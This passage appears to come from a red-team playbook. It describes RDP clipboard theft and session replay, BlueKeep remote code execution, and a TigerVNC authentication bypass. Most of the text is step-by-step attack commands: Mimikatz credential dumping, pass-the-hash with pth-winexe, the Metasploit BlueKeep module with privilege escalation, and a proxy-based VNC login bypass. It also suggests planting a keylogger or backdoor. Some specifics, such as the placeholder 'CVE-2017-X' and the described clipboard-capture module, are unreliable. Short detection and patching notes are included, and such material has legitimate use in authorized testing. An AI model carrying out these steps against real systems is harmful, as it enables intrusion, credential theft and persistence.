- **Scenario**: In RDP environments, users often copy sensitive content (e.g., passwords, tokens) to or from the clipboard. If clipboard redirection is enabled, attackers with RDP access can monitor or hijack clipboard data. Additionally, session hijacking is possible through replay attacks if credentials or tokens are reused or poorly protected in memory. This technique abuses live or cached session artifacts for lateral movement or privilege escalation.
- **Attack Steps**: Step 1: Gain Access to a Host with Active RDP SessionUse phishing, social engineering, or stolen credentials to access a machine where an RDP session is running or clipboard redirection is enabled.Step 2: Enable or Monitor Clipboard SharingIf clipboard redirection is enabled, any copy-paste operation is shared across the RDP channel.Check by copying text on host and pasting on attacker's session:CTRL+C → CTRL+VUse PowerShell or registry to verify:powershell<br>Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' -Name fDisableClipboard<br>Step 3: Extract Sensitive Clipboard DataInstall or run clipmon (clipboard monitor), or use PowerShell:powershell<br>Get-Clipboard<br>If password managers, command output, or tokens were copied, you’ll capture them.Step 4: Attempt Session Replay via Token or CookieUse tools like Mimikatz to extract tokens:bash<br>mimikatz<br>sekurlsa::logonpasswords<br>sekurlsa::tickets<br>With valid Kerberos tickets or NTLM hashes, try replay or Pass-the-Hash attacks:bash<br>pth-winexe -U 'DOMAIN\User%HASH' //Target cmd.exe<br>Step 5: Observe Session Behavior or Hijack GUIWith RDP tools like RDPY (proxy) or VNC injection, an attacker can interact with open sessions without re-authentication, especially if session locking is disabled.Optional – Metasploit Module UsageUse auxiliary modules to dump RDP clipboard:bash<br>msf> use auxiliary/server/capture/rdp<br>⚠️ Warning: Session hijack via replay depends on session persistence, token validity, and clipboard access rights.
- **Detection**: - Monitor clipboard events- Audit RDP logins and clipboard redirection- Alert on suspicious session replays
- **Solution**: - Disable clipboard redirection- Enforce session locking- Clear session artifacts on logout- Use MFA and token expiry
- **Tags**: #SessionHijack #ClipboardAbuse #RDPExploit #TokenReplay #RedTeam #LateralMovement #PassTheHash

## BlueKeep – RDP Remote Code Execution

- **Attack Type**: Remote Code Execution (RCE) in RDP

- **Scenario**: BlueKeep (CVE-2019-0708) affects unpatched Windows versions running RDP with weak security settings. Attackers can send specially crafted RDP packets to perform unauthenticated remote code execution. This vulnerability has been actively exploited for wormable attacks and ransomware deployment.
- **Attack Steps**: Step 1: Scan for Vulnerable HostsRun:bash<br>nmap -p 3389 --script rdp-vuln-cve2019-0708 <target-ip-range>If the host is vulnerable, you’ll see STATE: VULNERABLE in the scan output.Step 2: Launch Exploit Modulebash<br>msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br>msf> set RHOSTS <target-ip><br>msf> run<br>Step 3: Observe Meterpreter SessionUpon success, you’ll receive a shell:bash<br>meterpreter > getuid<br>Check privileges.Step 4: Escalate and PivotRun local privilege escalation, e.g.:bash<br>run post/windows/escalate/getsystem<br>Use meterpreter > ps, mimikatz or file exfiltration.Step 5: CleanupClose sessions:bash<br>sessions -K<br>Quickly patch target and disable vulnerable RDP protocol; monitor logs for exploit attempts.🛡 Ethical testers must only use this on authorized, isolated environments.
- **Detection**: - IDS/IPS signatures for BlueKeep- Monitor RDP logs for malformed traffic- SIEM alerts on repeat exploitation attempts
- **Solution**: - Apply Microsoft patches- Disable RDP if not needed- Use RDP Gateways with MFA- Enable network-level authentication (NLA)
- **Tags**: #BlueKeep #RDPExploit #RemoteCodeExecution #RedTeam #MSF #CVE2019-0708

## TigerVNC Authentication Bypass (CVE-2017-X)

- **Attack Type**: Authentication Bypass in VNC
- **Target**: Linux or Windows machines running TigerVNC
- **Vulnerability**: Flaw in VNC challenge/response handshake permitting no-auth login
- **MITRE**: T1021.001 – Remote Services: VNC
- **Impact**: Full desktop accessPrivacy breachPotential for code execution on victim session
- **Tools**: ✅ RFBproxy✅ Wireshark✅ nmap✅ VNC viewers (e.g., vncviewer)
- **Scenario**: A vulnerability in some TigerVNC versions allowed attackers to bypass authentication by exploiting a flaw in the challenge/response handshake. No valid credentials are required. The attacker can send altered packets to the VNC server, granting access to the desktop and all active sessions. Presents serious risk in legacy or unmanaged environments.
- **Attack Steps**: Step 1: Identify Affected VersionsUse Nmap to detect server versions with fingerprinting:bash<br>nmap -p 5900 --script vnc-info <target-ip>Look for TigerVNC 1.7.x.Step 2: Exploit Authentication FlowUse a modified VNC client or intercept with RFBproxy:bash<br>RFBproxy -b <target-ip>:5900 -l localhost:5901<br>Some patched clients will auto-authenticate.Step 3: Connect Locally to Proxybash<br>vncviewer localhost:5901<br>You will gain GUI access without password.Step 4: Verify Session RightsCheck if you can open terminal, exfiltrate data, or escalate privileges. The session runs under the victim’s context.Step 5: (Optional) Inject Keylogger or BackdoorLaunch a stealthy keylogger or create persistence in ~/.vnc/ or autostart folders.Step 6: Secure and PatchImmediately update TigerVNC to fixed versions and audit other exposed hosts.
- **Detection**: - Network DPI to detect malformed VNC handshake- Monitor VNC logs for unauthorized access- IDS rules for this specific CVE
- **Solution**: - Upgrade TigerVNC to fixed release- Limit VNC exposure via firewall/VPN- Enforce strong passwords
- **Tags**: #TigerVNC #CVE2017 #VNCAccess #AuthBypass #RedTeam #RFBproxy
